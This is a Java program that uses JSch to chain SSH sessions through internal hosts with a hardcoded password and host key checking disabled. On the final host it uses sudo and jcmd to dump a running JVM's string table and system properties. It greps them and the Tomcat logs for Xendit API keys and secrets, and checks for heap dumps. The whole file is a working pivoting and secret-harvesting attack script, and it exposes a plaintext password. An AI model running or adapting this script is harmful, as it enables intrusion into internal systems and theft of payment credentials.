import com.jcraft.jsch.*;
import java.io.*;
class FR2 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    ChannelExec ch = (ChannelExec) s2.openChannel("exec");
    // Use jcmd to dump string table from NEO JVM
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.196 'echo ---JCMD-STRING-TABLE---;echo kutul0nc4t | sudo -S -u neo-tmct /usr/lib/jvm/java-1.8.0-amazon-corretto/bin/jcmd 789 VM.stringtable 2>&1 | grep xnd_ | head -20;echo ---JCMD-SYSPROPS---;echo kutul0nc4t | sudo -S -u neo-tmct /usr/lib/jvm/java-1.8.0-amazon-corretto/bin/jcmd 789 VM.system_properties 2>&1 | grep -iE \"xendit|xnd_|api.key|secret\" | head -10;echo ---LOG-GREP---;grep -r \"xnd_production\" /progs/neo/neo-app/tomcat/8.0.53/logs/ 2>/dev/null | tail -5;echo ---HEAPDUMP-EXISTS---;ls -la /progs/neo/neo-app/tomcat/8.0.53/heapdump* 2>/dev/null' 2>&1 | head -30");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
